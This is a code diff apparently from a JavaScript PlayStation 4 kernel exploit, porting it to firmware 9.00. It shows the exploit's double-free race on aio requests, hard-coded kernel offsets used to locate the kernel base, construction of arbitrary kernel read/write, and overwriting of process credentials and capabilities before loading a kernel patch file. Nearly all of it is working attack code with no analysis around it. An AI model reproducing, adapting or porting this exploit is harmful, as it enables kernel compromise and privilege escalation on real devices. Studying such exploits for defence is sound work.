@@ -706,9 +706,8 @@ function double_free_reqs2(sds) {
         aio_multi_poll(aio_ids_p, num_reqs);
 
         // drop the reference so that aio_multi_delete() will trigger _fdrop()
-        close(sd_client);
-
         const res = race_one(req_addr, sd_conn, barrier, racer, sds);
+        //alert(res);
         racer.reset();
 
         // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
@@ -717,6 +716,7 @@ function double_free_reqs2(sds) {
         close(sd_conn);
 
         if (res !== null) {
+            
             log(`won race at attempt: ${i}`);
             close(sd_listen);
             call_nze('pthread_barrier_destroy', barrier.addr);
@@ -1243,13 +1243,13 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     // TODO FW dependent parts! assume ps4 9.000 for now
     //TODO: Needs porting to 9.00
-    const off_kstr = 0x7edcff;
+    const off_kstr = 0x7f6f27;
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
     log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
-    const off_cpuid_to_pcpu = 0x228e6b0;
+    const off_cpuid_to_pcpu = 0x21ef2a0;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
     const pcpu = kread64(pcpu_p);
@@ -1525,7 +1525,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-    const buf = await get_patches('/kpatch/80x.elf');
+    const buf = await get_patches('/kpatch/900.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
     const patches = new View1(await buf, 0x1000);
